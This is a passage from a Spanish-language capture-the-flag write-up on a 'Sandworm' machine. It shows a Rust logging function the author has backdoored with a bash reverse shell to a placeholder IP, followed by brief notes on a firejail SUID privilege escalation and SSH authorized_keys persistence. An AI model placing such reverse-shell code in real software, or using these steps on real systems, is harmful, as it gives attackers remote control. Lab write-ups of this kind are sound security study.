+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">extern</span> <span class="n">crate</span> <span class="n">chrono</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">fs</span><span class="p">::</span><span class="n">OpenOptions</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">io</span><span class="p">::</span><span class="n">Write</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">chrono</span><span class="p">::</span><span class="nn">prelude</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">process</span><span class="p">::</span><span class="n">Command</span><span class="p">;</span>
+
+<span class="k">pub</span> <span class="k">fn</span> <span class="k">log</span><span class="p">(</span><span class="n">user</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span> <span class="n">query</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span> <span class="n">justification</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">command</span> <span class="o">=</span> <span class="s">"bash -i &gt;&amp; /dev/tcp/&lt;tu IP&gt;/444 0&gt;&amp;1"</span><span class="p">;</span>
+
+    <span class="k">let</span> <span class="n">output</span> <span class="o">=</span> <span class="nn">Command</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="s">"bash"</span><span class="p">)</span>
+        <span class="nf">.arg</span><span class="p">(</span><span class="s">"-c"</span><span class="p">)</span>
+        <span class="nf">.arg</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+        <span class="nf">.output</span><span class="p">()</span>
+        <span class="nf">.expect</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">);</span>
+
+    <span class="k">let</span> <span class="n">now</span> <span class="o">=</span> <span class="nn">Local</span><span class="p">::</span><span class="nf">now</span><span class="p">();</span>
+    <span class="k">let</span> <span class="n">timestamp</span> <span class="o">=</span> <span class="n">now</span><span class="nf">.format</span><span class="p">(</span><span class="s">"%Y-%m-%d %H:%M:%S"</span><span class="p">)</span><span class="nf">.to_string</span><span class="p">();</span>
+    <span class="k">let</span> <span class="n">log_message</span> <span class="o">=</span> <span class="nd">format!</span><span class="p">(</span><span class="s">"[{}] - User: {}, Query: {}, Justification: {}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">justification</span><span class="p">);</span>
+
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">file</span> <span class="o">=</span> <span class="k">match</span> <span class="nn">OpenOptions</span><span class="p">::</span><span class="nf">new</span><span class="p">()</span><span class="nf">.append</span><span class="p">(</span><span class="k">true</span><span class="p">)</span><span class="nf">.create</span><span class="p">(</span><span class="k">true</span><span class="p">)</span><span class="nf">.open</span><span class="p">(</span><span class="s">"/opt/tipnet/access.log"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">Ok</span><span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="n">file</span><span class="p">,</span>
+        <span class="nf">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="p">{</span>
+            <span class="nd">println!</span><span class="p">(</span><span class="s">"Error opening log file: {}"</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+
+    <span class="k">if</span> <span class="k">let</span> <span class="nf">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">=</span> <span class="n">file</span><span class="nf">.write_all</span><span class="p">(</span><span class="n">log_message</span><span class="nf">.as_bytes</span><span class="p">())</span> <span class="p">{</span>
+        <span class="nd">println!</span><span class="p">(</span><span class="s">"Error writing to log file: {}"</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Despues de un ratito nos llega la rev shell</p>
+
+<p><img src="/assets/img/sandworm/12.png" alt="" /></p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Si buscamos por biarios SUID podemos ver uno de firejail</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/usr/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">firejail</span>
+</code></pre></div></div>
+
+<p>Ah este punto toca buscar en google exploits de firejail que nos permitan escalar privilegios, y encontre este: <a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25</a></p>
+
+<p>Antes de ejecurlo, necesitamos tener otra conexion como Atlas, lo mas sencillo es tener nuestra id_rsa.pub como authorized_keys en el directorio .ssh de Atlas (tipico mecanismo de persistencia por SSH), y ahora si podemos ejecutarlo y seguir los pasos que nos dice y ya seremos root:</p>
+
+<p><img src="/assets/img/sandworm/13.png" alt="" /></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+:ET
